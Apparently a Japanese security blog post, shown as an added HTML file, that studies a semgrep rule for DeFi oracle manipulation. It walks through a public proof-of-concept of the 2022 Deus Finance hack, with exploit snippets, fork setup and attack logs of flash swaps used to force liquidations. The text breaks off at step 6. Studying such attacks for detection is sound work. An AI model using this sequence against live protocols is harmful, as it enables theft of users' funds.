@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="dark">
+    <title>semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation) | mute1997.github.io</title>
+
+    
+    
+    
+    <meta property="og:site_name" content="" />
+    <meta property="og:title" content="semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation) | mute1997.github.io"/>
+    <meta itemprop="name" content="semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation) | mute1997.github.io" />
+    <meta name="twitter:title" content="semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation) | mute1997.github.io" />
+    <meta name="application-name" content="semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation) | mute1997.github.io" /><meta name="twitter:card" content="summary"/>
+
+    <meta name="description" content="" />
+    <meta name="twitter:description" content=""/>
+    <meta itemprop="description" content=""/>
+    <meta property="og:description" content="" />
+
+    
+
+<meta property="og:type" content="article" />
+<meta property="article:publisher" content="" />
+<meta property="og:article:published_time" content=2022-04-20T00:00:00Z />
+<meta property="article:published_time" content=2022-04-20T00:00:00Z />
+
+
+
+
+
+<script defer type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "headline": "semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation)",
+    "author": {
+      "@type": "Person",
+      "name": ""
+    },
+    "datePublished": "2022-04-20",
+    "description": "",
+    "wordCount":  832 ,
+    "mainEntityOfPage": "True",
+    "dateModified": "2022-04-20",
+    "publisher": {
+      "@type": "Organization",
+      "name": "",
+      "logo": {
+        "@type": "imageObject",
+        "url": "https:\/\/mute1997.github.io\/favicon.ico"
+      }
+    }
+  }
+</script>
+
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    
+    <link rel="stylesheet" href="/sass/main.min.ab99ff095f832511e24ffb2fba2b51ad473b2f7e9301d674eba2c6c3a6e8bd81.css">
+    
+</head>
+    
+    <script>
+        (function() {
+            const colorSchemeKey = 'ThemeColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'ThemeColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.userColorScheme = 'dark';
+        } else {
+            document.documentElement.dataset.userColorScheme = 'light';
+        }
+    })();
+</script>
+
+
+    <body class="dark">
+        <nav class="navbar">
+    <div class="container">
+        <div class="flex">
+            <div>
+                <a class="brand" href="/">
+                    
+                    <span class="emoji">
+                        😎
+                    </span>
+                    
+                    
+                    mute1997.github.io
+                    </a>
+            </div>
+            <div class="flex">
+                
+                <a href="/articles/">Articles</a>
+                
+                
+                    <button id="dark-mode-button">
+                    <svg class="light" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" focusable="false" width="1em" height="1em" style="-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); transform: rotate(360deg);" preserveAspectRatio="xMidYMid meet" viewBox="0 0 36 36"><path fill="#FFD983" d="M30.312.776C32 19 20 32 .776 30.312c8.199 7.717 21.091 7.588 29.107-.429C37.9 21.867 38.03 8.975 30.312.776z"/><path d="M30.705 15.915a1.163 1.163 0 1 0 1.643 1.641a1.163 1.163 0 0 0-1.643-1.641zm-16.022 14.38a1.74 1.74 0 0 0 0 2.465a1.742 1.742 0 1 0 0-2.465zm13.968-2.147a2.904 2.904 0 0 1-4.108 0a2.902 2.902 0 0 1 0-4.107a2.902 2.902 0 0 1 4.108 0a2.902 2.902 0 0 1 0 4.107z" fill="#FFCC4D"/><rect x="0" y="0" width="36" height="36" fill="rgba(0, 0, 0, 0)" /></svg>
+                    <svg class="dark" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" focusable="false" width="1em" height="1em" style="-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); transform: rotate(360deg);" preserveAspectRatio="xMidYMid meet" viewBox="0 0 36 36"><path fill="#FFD983" d="M16 2s0-2 2-2s2 2 2 2v2s0 2-2 2s-2-2-2-2V2zm18 14s2 0 2 2s-2 2-2 2h-2s-2 0-2-2s2-2 2-2h2zM4 16s2 0 2 2s-2 2-2 2H2s-2 0-2-2s2-2 2-2h2zm5.121-8.707s1.414 1.414 0 2.828s-2.828 0-2.828 0L4.878 8.708s-1.414-1.414 0-2.829c1.415-1.414 2.829 0 2.829 0l1.414 1.414zm21 21s1.414 1.414 0 2.828s-2.828 0-2.828 0l-1.414-1.414s-1.414-1.414 0-2.828s2.828 0 2.828 0l1.414 1.414zm-.413-18.172s-1.414 1.414-2.828 0s0-2.828 0-2.828l1.414-1.414s1.414-1.414 2.828 0s0 2.828 0 2.828l-1.414 1.414zm-21 21s-1.414 1.414-2.828 0s0-2.828 0-2.828l1.414-1.414s1.414-1.414 2.828 0s0 2.828 0 2.828l-1.414 1.414zM16 32s0-2 2-2s2 2 2 2v2s0 2-2 2s-2-2-2-2v-2z"/><circle fill="#FFD983" cx="18" cy="18" r="10"/><rect x="0" y="0" width="36" height="36" fill="rgba(0, 0, 0, 0)" /></svg>
+                    </button>
+                
+            </div>
+            </div>
+    </div>
+</nav>
+
+        <main>
+            
+<div class="container">
+    <article>
+        <header class="article-header">
+            <div class="thumb">
+                <div>
+                    <h1>semgrep-smart-contractsをすべて読む #01 (basic-oracle-manipulation)</h1>
+                    <div class="post-meta">
+                        <div>
+                            
+                            
+                              
+                            
+                            By  | <time>April 20, 2022</time>
+                            | 4 minutes
+                        </div>
+                        <div class="tags">
+                            
+                            <a href="/tags/security/">security</a>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </article>
+
+    <div class="article-post">
+    <p><a href="https://github.com/Raz0r/semgrep-smart-contracts">semgrep-smart-contracts</a> というリポジトリがあります。
+これは、スマートコントラクトの脆弱性を発見するための、semgrepルールをまとめたものです。</p>
+<p>このリポジトリの、検出ルールと脆弱なコードを読んでいくことで、スマートコントラクトの脆弱性を学びます。今回は、以下のルールを読んでいきます。</p>
+<ul>
+<li><a href="https://github.com/Raz0r/semgrep-smart-contracts/blob/master/solidity/basic-oracle-manipulation.yaml">basic-oracle-manipulation.yaml</a></li>
+<li><a href="https://github.com/Raz0r/semgrep-smart-contracts/blob/master/solidity/basic-oracle-manipulation.sol">basic-oracle-manipulation.sol</a></li>
+</ul>
+<h4 id="検出ルール">
+    <a href="#%e6%a4%9c%e5%87%ba%e3%83%ab%e3%83%bc%e3%83%ab" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    検出ルール
+</h4>
+<p>まず、semgrepのルールを理解するために、ルールを日本語として表現します。</p>
+<ul>
+<li>関数内の処理であること</li>
+<li>関数の名称が <code>(?i)get([a-z0-9_])*price</code> にマッチすること</li>
+<li><code>$X.div($Y)</code>、もしくは<code>$X / $Y</code>であること</li>
+<li><code>$X</code>は以下の文字列のどれかを含むこと
+<ul>
+<li><code>underlying</code></li>
+<li><code>underlyingUnit</code></li>
+<li><code>pair</code></li>
+<li><code>reserve</code></li>
+<li><code>reserve0</code></li>
+<li><code>reserve1</code></li>
+</ul>
+</li>
+<li><code>$Y</code>は<code>.*totalSupply.*</code>にマッチすること</li>
+</ul>
+<p>このルールを実行すると、以下の2つがsemgrepによって検出されます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="mi">101</span><span class="err">┆</span> <span class="n">_sharePrice</span> <span class="o">=</span> <span class="n">totalSupply</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span>
+<span class="mi">102</span><span class="err">┆</span>     <span class="o">?</span> <span class="n">underlyingUnit</span>
+<span class="mi">103</span><span class="err">┆</span>     <span class="o">:</span> <span class="n">underlyingUnit</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">balanceWithInvested</span><span class="p">()).</span><span class="n">div</span><span class="p">(</span><span class="n">totalSupply</span><span class="p">());</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="mi">355</span><span class="err">┆</span> <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
+<span class="mi">356</span><span class="err">┆</span>     <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>ルールと、何が検出されるのかは分かったものの、これだけでは何が脆弱なのか分からないので、エクスプロイトを調べてみます。</p>
+<h4 id="エクスプロイト">
+    <a href="#%e3%82%a8%e3%82%af%e3%82%b9%e3%83%97%e3%83%ad%e3%82%a4%e3%83%88" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    エクスプロイト
+</h4>
+<p>このスマートコントラクトに刺さるエクスプロイトを調べてみます。
+Deus Financeというプロジェクトで、この手法を用いたハッキング被害が起こったようです。</p>
+<ul>
+<li><a href="https://coinpost.jp/?p=330583">Deus Financeなど複数のDeFiプロトコルで16億円超のハッキング被害</a></li>
+<li><a href="https://pwned-no-more.notion.site/The-Deus-Hack-Explained-647bf97afa2b4e4e9e8b882e68a75c0b">The Deus Hack Explained</a></li>
+<li><a href="https://knownseclab.com/en/news/62317468d5b228005a55cd45">Deus Finance oracle attack event analysis</a></li>
+<li><a href="https://lafayettetabor.medium.com/deus-post-mortem-3c65df12927f">DEUS post mortem</a></li>
+</ul>
+<p>GitHubにエクスプロイトがあったので、これを読んで見ることにします。</p>
+<p><a href="https://github.com/PwnedNoMore/postmortem/blob/main/2022/deus/contracts/Exploit.sol">https://github.com/PwnedNoMore/postmortem/blob/main/2022/deus/contracts/Exploit.sol</a></p>
+<p>注意として、このエクスプロイトは2022年の3/15に発生したエクスプロイトになります。</p>
+<p>Deus Financeでは、2022年の4/28にもオラクルを操作した問題が再発生しています。</p>
+<p>まずはローカルのネットワークでこのエクスプロイトを実行をしてみます。
+もともと <code>hardhat.config.js</code> に指定されているURLではダメなようなので、<code>https://rpc.fantom.network/</code>に変更して動作させます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript">      <span class="nx">forking</span><span class="o">:</span> <span class="p">{</span>
+        <span class="nx">url</span><span class="o">:</span> <span class="s2">&#34;https://rpc.fantom.network/&#34;</span><span class="p">,</span>
+        <span class="nx">blockNumber</span><span class="o">:</span> <span class="mi">33466613</span>
+      <span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>npx hardhat run scripts/main.js</code> コマンドを実行すると、以下のような出力が得られます。</p>
+<pre><code>    [+] (0) before attack
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 0
+    [+]      spirit USDC reserve: 9713881664165
+    [+]      spirit DEI reserve: 9739342685820948870544271
+    [+]      the amount of DEI to borrow (spirit): 9739342685820948870544270
+    [+]      the amount of DEI to pay back (spirit): 9768648631716097162030362
+
+    [+] (1) flash swap from spirit pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 9739342685820948870544270
+    [+]      sAMM USDC reserve: 24660757275320
+    [+]      sAMM DEI reserve: 24772798349205085390700207
+    [+]      the amount of DEI to borrow (sAMM): 24772798349205085390700206
+    [+]      the amount of DEI to pay back (sAMM): 24775275876792764667166923
+    [+]      sAMM LP price: 2000000005487107362736617
+
+    [+] (2) flash swap from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 34512141035026034261244476
+    [+]      my LP deposit token balance: 0
+    [+]      my LP token balance: 0
+    [+]      sAMM LP price: 997733504354413127115105
+
+    [+] (3) liquidate the assets of victims
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 27150599219672207566872765
+    [+]      my LP deposit token balance: 5230026958164438186
+    [+]      my LP token balance: 0
+
+    [+] (4) exit the flash swap from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 2375323342879442899705842
+    [+]      my LP deposit token balance: 5230026958164438186
+    [+]      my LP token balance: 0
+
+    [+] (5) deposit LP deposit tokens to earn LP tokens
+    [+]      my LP deposit token balance: 0
+    [+]      my LP token balance: 5230026958164438186
+
+    [+] (6) remove liquidity
+    [+]      my USDC balance: 5218173124837
+    [+]      my DEI balance: 7617204163068582172512381
+    [+]      my LP token balance: 0
+
+    [+] (7) swap USDC to DEI from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 12787419360961504871925327
+
+    [+] (8) exit the flash swap from spirit pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 3018770729245407709894965
+
+    [+] (9) swap DEI to USDC from sAMM pool
+    [+]      my USDC balance: 3064570164495
+    [+]      my DEI balance: 0
+</code></pre><p>全部で9つのステップあるので、1ステップずつ読んでいきます。</p>
+<h5 id="1--フラッシュスワップでdeiの借り入れ">
+    <a href="#1--%e3%83%95%e3%83%a9%e3%83%83%e3%82%b7%e3%83%a5%e3%82%b9%e3%83%af%e3%83%83%e3%83%97%e3%81%a7dei%e3%81%ae%e5%80%9f%e3%82%8a%e5%85%a5%e3%82%8c" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    1 ) フラッシュスワップでDEIの借り入れ
+</h5>
+<p>エクスプロイトではまず、 <code>0x8eFD36aA4Afa9F4E157bec759F1744A7FeBaEA0e</code> から、フラッシュスワップを利用してDEIを借り入れます。</p>
+<p>フラッシュスワップについてはこちらを参照してください。</p>
+<p><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps">https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/using-flash-swaps</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">spiritUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>この借り入れは、オラクルを操作した後、ユーザーの負債を返却する際に利用されます。</p>
+<p>swapのコールバック関数の中で、<code>my DEI balance</code>が大きく増えていることが確認できます。</p>
+<pre><code>    [+] (1) flash swap from spirit pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 9739342685820948870544270
+    [+]      sAMM USDC reserve: 24660757275320
+    [+]      sAMM DEI reserve: 24772798349205085390700207
+    [+]      the amount of DEI to borrow (sAMM): 24772798349205085390700206
+    [+]      the amount of DEI to pay back (sAMM): 24775275876792764667166923
+    [+]      sAMM LP price: 2000000005487107362736617
+</code></pre><h5 id="2--オラクル計算元からdeiの借り入れ">
+    <a href="#2--%e3%82%aa%e3%83%a9%e3%82%af%e3%83%ab%e8%a8%88%e7%ae%97%e5%85%83%e3%81%8b%e3%82%89dei%e3%81%ae%e5%80%9f%e3%82%8a%e5%85%a5%e3%82%8c" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    2 ) オラクル計算元からDEIの借り入れ
+</h5>
+<p>次に、<code>0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0</code> から、DEIを借り入れます。</p>
+<p>これは、上記アドレスのDEI, USDCの残高がオラクルとして用いられているため、それを操作する目的で借り入れるものです。</p>
+<p>このようにして大量に借り入れることで価値が下がり、ユーザーの清算処理を行うことができます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">sAMMUsdcDei</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">_reserve1</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">me</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="kt">uint8</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)));</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>借り入れ後、さらに<code>my DEI balance</code>が上昇していることが分かります。</p>
+<pre><code>    [+] (2) flash swap from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 34512141035026034261244476
+    [+]      my LP deposit token balance: 0
+    [+]      my LP token balance: 0
+    [+]      sAMM LP price: 997733504354413127115105
+</code></pre><h5 id="3--特定ユーザーの清算処理">
+    <a href="#3--%e7%89%b9%e5%ae%9a%e3%83%a6%e3%83%bc%e3%82%b6%e3%83%bc%e3%81%ae%e6%b8%85%e7%ae%97%e5%87%a6%e7%90%86" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    3 ) 特定ユーザーの清算処理
+</h5>
+<p>以下のコードが呼び出され、特定のユーザーに対して清算処理が行われます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="n">dei</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">mintHelper</span><span class="p">(),</span> <span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">me</span><span class="p">));</span>
+<span class="n">deiLenderSolidex</span><span class="p">.</span><span class="n">liquidate</span><span class="p">(</span><span class="n">victims</span><span class="p">,</span> <span class="n">me</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>清算処理が実行されると、以下のコードが呼び出されます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">function</span> <span class="nf">isSolvent</span><span class="p">(</span><span class="kt">address</span> <span class="n">user</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// accrue must have already been called!
+</span><span class="c1"></span>
+    <span class="kt">uint256</span> <span class="n">userCollateralAmount</span> <span class="o">=</span> <span class="n">userCollateral</span><span class="p">[</span><span class="n">user</span><span class="p">];</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">userCollateralAmount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span> <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+
+    <span class="k">return</span>
+        <span class="n">userCollateralAmount</span><span class="p">.</span><span class="n">mul</span><span class="p">(</span><span class="n">oracle</span><span class="p">.</span><span class="n">getPrice</span><span class="p">()).</span><span class="n">mul</span><span class="p">(</span><span class="n">LIQUIDATION_RATIO</span><span class="p">)</span> <span class="o">/</span>
+            <span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">).</span><span class="n">mul</span><span class="p">(</span><span class="mi">1</span><span class="n">e18</span><span class="p">))</span> <span class="o">&gt;</span>
+        <span class="n">getDebt</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>このとき、清算処理が実際に行われるかどうかを判断するために、getPrice関数が呼び出されます。
+この関数は、プールしてあるDEIとUSDCの量から、DEIの価格を返却する関数です。</p>
+<p>ステップ2でフラッシュスワップしているため、DEIの残高が低下しています。
+そのため、担保割れしていると判断され、清算処理が行われます。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">function</span> <span class="nf">getPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span>
+        <span class="p">((</span><span class="n">dei</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">+</span> <span class="p">(</span><span class="n">usdc</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pair</span><span class="p">))</span> <span class="o">*</span> <span class="mi">1</span><span class="n">e12</span><span class="p">))</span> <span class="o">*</span>
+            <span class="mi">1</span><span class="n">e18</span><span class="p">)</span> <span class="o">/</span> <span class="n">pair</span><span class="p">.</span><span class="n">totalSupply</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><pre><code>    [+] (3) liquidate the assets of victims
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 27150599219672207566872765
+    [+]      my LP deposit token balance: 5230026958164438186
+    [+]      my LP token balance: 0
+</code></pre><h5 id="4--ステップ2でフラッシュスワップしたものを返却">
+    <a href="#4--%e3%82%b9%e3%83%86%e3%83%83%e3%83%972%e3%81%a7%e3%83%95%e3%83%a9%e3%83%83%e3%82%b7%e3%83%a5%e3%82%b9%e3%83%af%e3%83%83%e3%83%97%e3%81%97%e3%81%9f%e3%82%82%e3%81%ae%e3%82%92%e8%bf%94%e5%8d%b4" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    4 ) ステップ2でフラッシュスワップしたものを返却
+</h5>
+<p>攻撃の肝となる部分はほとんど終わったため、ここから先はフラッシュスワップの返却やLPトークンの売却などが行われます。</p>
+<p>このステップでは、ステップ2で借り入れていたDEIの返却を行っています。</p>
+<p>ログから、<code>my DEI balance</code>が低下していることが分かります。</p>
+<pre><code>    [+] (4) exit the flash swap from sAMM pool
+    [+]      my USDC balance: 0
+    [+]      my DEI balance: 2375323342879442899705842
+    [+]      my LP deposit token balance: 5230026958164438186
+    [+]      my LP token balance: 0
+</code></pre><h5 id="5--lpトークンの引き出し">
+    <a href="#5--lp%e3%83%88%e3%83%bc%e3%82%af%e3%83%b3%e3%81%ae%e5%bc%95%e3%81%8d%e5%87%ba%e3%81%97" class="anchor">
+        <svg class="icon" aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16">
+            <path fill-rule="evenodd"
+                d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z">
+            </path>
+        </svg>
+    </a>
+    5 ) LPトークンの引き出し
+</h5>
+<p>depositされているLPトークンを引き出します。</p>
+<pre><code>    [+] (5) deposit LP deposit tokens to earn LP tokens
+    [+]      my LP deposit token balance: 0
+    [+]      my LP token balance: 5230026958164438186
+</code></pre><h5 id="6--lpトークンのburn">
